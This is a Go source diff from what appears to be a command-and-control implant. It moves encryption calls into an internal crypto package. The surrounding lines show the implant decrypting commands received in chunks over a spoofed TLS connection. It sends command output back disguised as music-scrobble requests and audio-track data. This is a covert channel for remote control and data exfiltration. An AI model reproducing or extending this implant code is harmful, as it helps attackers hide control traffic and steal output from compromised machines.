@@ -1,5 +1,5 @@
 package main
-
+import "c2ne/internal/crypto"
 import (
 	"fmt"
 	"net"
@@ -221,7 +221,7 @@ func decoderEngine(chunkChan <- chan []byte, uConn *utls.UConn, reader *bufio.Re
 					chunkStartCheck = "true"
 					finalCommand := strings.Replace(string(decoded_cmd_byte), "STOP", "", -1)
 
-					finalCommand , err:= decrypt(key, []byte(finalCommand))
+					finalCommand , err:= crypto.Decrypt(key, []byte(finalCommand))
 					if  echo_to_stdout=="true"{fmt.Println("decrypted cmd - ", finalCommand)}
 					
 					if err!=nil{
@@ -384,7 +384,7 @@ type ScrobbleRequest struct{
 
 }
 func uploadOutputAsScrobble(output string, uConn *utls.UConn, reader *bufio.Reader){
-	output, _ = encrypt(key, []byte(output))
+	output, _ = crypto.Encrypt(key, []byte(output))
 	payload := ScrobbleRequest{
 		Method : "track.Scrobble",
 		Timestamp : strconv.FormatInt(time.Now().Unix(), 10),
@@ -425,7 +425,7 @@ func uploadOutputAsScrobble(output string, uConn *utls.UConn, reader *bufio.Read
 }
 
 func encoding_engine(output string, uConn *utls.UConn, reader *bufio.Reader){
-	output, _ = encrypt(key, []byte(output))
+	output, _ = crypto.Encrypt(key, []byte(output))
 	output = "STRT"+output+"STOP"
 
 	var newAudioTrack []byte
